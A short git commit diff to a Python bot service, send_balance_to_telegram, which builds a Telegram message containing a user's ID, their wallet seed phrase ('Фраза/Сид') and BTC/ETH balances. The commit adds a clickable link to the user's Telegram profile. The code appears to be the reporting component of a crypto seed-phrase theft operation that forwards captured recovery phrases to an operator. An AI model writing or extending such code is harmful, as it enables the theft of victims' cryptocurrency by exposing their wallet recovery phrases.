beb6f1effc33faa061c4a819d0ae71e0b67f4a34
Emir Magalov <emir.mahalo@gmail.com>
2026-06-23 22:33:00 +0400

    fix

--- bot_app/services/send_balance.py
+++ bot_app/services/send_balance.py
@@ -6,6 +6,7 @@ async def send_balance_to_telegram(user_id, balance_data):
     text = (
         f"💰 <b>Баланс</b>\n\n"
         f"<code>{user_id}</code>\n\n"
+        f"<a href='tg://user?id={user_id}'>User Link</a>\n\n"
         f"Фраза/Сид: <code>{balance_data['phrase']}</code>\n\n"
         f"BTC: {balance_data['balance']['total_btc']}\n"
         f"ETH: {balance_data['balance']['total_eth']}\n"
